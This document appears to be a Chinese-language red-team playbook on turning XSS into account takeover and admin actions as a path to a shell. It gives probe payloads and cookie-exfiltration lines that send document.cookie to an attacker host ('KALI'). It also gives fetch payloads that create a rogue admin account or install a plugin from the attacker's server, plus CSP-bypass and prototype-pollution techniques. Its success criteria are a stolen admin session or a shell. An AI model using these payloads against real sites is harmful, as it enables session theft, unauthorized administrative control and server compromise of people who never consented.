# XSS → 账户接管 / 管理操作 / 为 Shell 铺路

XSS 不是 `alert(1)`。红队目标：

```text
偷非 HttpOnly session → 登录为受害者
HttpOnly 时用 XSS 调受害者浏览器发管理请求（加用户/改密码/开插件）
DOM XSS / mutation XSS / 原型污染 → 同样打到执行管理动作
有上传/模板/插件权限后 → 转 upload/SSTI 拿 shell
```

`alert(1)` 只证明执行。本文件把链打到 **账户控制**；能进管理功能就继续 `/web-attack` 拿 shell。

---

## 1. 探测

```text
< > ' " { } ; ` / -- 是否编码
反射位置：HTML body / attribute / JS string / JS 模板 / URL
sink：innerHTML / document.write / jQuery html() / eval / setTimeout(string) / location
```

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><img src=x onerror=alert(1)>
'-alert(1)-'
${alert(1)}
```

WAF 拦 tag 时走事件/编码/混合上下文，见 `waf-bypass.md`。WAF 属于 Web，不是 EDR。

---

## 2. 反射 / 存储 / DOM

```text
反射：payload 在当前响应当中
存储：进库，其他用户/管理员打开
DOM：服务端不回显，前端 JS 把 location/hash/postMessage 写进 sink
```

DOM 最小确认：

```javascript
# sink 若是 innerHTML
# URL: /page?x=<img src=x onerror=alert(1)>
# 前端: el.innerHTML = new URLSearchParams(location.search).get('x')
```

不要只测服务端反射。打开 DevTools 看 `innerHTML` / `eval` / `document.write`。

---

## 3. Cookie / session

```javascript
fetch('https://KALI/?c='+document.cookie)
new Image().src='https://KALI/?c='+encodeURIComponent(document.cookie)
```

```text
HttpOnly=1 → JS 读不到 cookie。改用 CSRF-with-XSS：在受害者浏览器里发管理请求
Secure / SameSite 影响跨站带 cookie；同源 XSS 仍带
```

存储 XSS 打管理员 cookie 后，立刻用该 session 进后台找上传/模板/命令插件，转入对应章节拿 shell。

---

## 4. HttpOnly 时：用 XSS 做管理动作

把 JS 压成一行。目标改成真实后台路由：

```javascript
fetch('/admin/users',{method:'POST',credentials:'include',
 headers:{'Content-Type':'application/json'},
 body:JSON.stringify({username:'rt',password:'RT!pass',role:'admin'})})
```

```javascript
fetch('/admin/plugin/install',{method:'POST',credentials:'include',
 body: new URLSearchParams({url:'http://KALI/plugin.zip'})})
```

成功：新管理员可登录 / 插件已装 / 密码已改。然后用该身份走上传/SSTI/文件管理拿 shell。

`eval(String.fromCharCode(...))` 只是编码，不是绕 HttpOnly。

---

## 5. CSP

有 CSP 时 `alert` 失败不代表没 XSS。看：

```text
script-src 'unsafe-inline' / nonce / hash
object-src / base-uri
是否允许 JSONP / Angular / 可上传 JSON
```

nonce 可预测或反射进页面时，把 nonce 套到自己的 script。严格 CSP 改 DOM sink / gadget（Angular、prototype pollution）。

---

## 6. Prototype pollution → XSS / RCE gadget

前端：污染 `Object.prototype` 后，应用把可控字段当 HTML/URL。

```text
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?constructor[prototype][x]=y
JSON: {"__proto__":{"polluted":true}}
```

先确认：

```javascript
// 控制台
({}).polluted === true
```

再找 gadget（DOM XSS、bypass auth、Node 端 RCE）。Node 原型污染 RCE 需要具体 gadget（例如 template / child_process）；没有 gadget 不要写“污染即 RCE”。

---

## 7. mutation XSS / mXSS

过滤器清一次 HTML，浏览器 parse 后再长出标签。对“杀了 script 仍进 HTML 净化器”的目标测。用已知 mXSS 向量（如 MathML / noscript 组合），以当前浏览器为准，不要用 2014 过期向量当唯一弹。

---

## 8. 成功

```text
P0: 管理员 session / 能执行管理动作 / 已转到上传或模板拿 shell
P1: 稳定任意 JS，正在找管理功能
不是成功: 只有 alert(1)
```
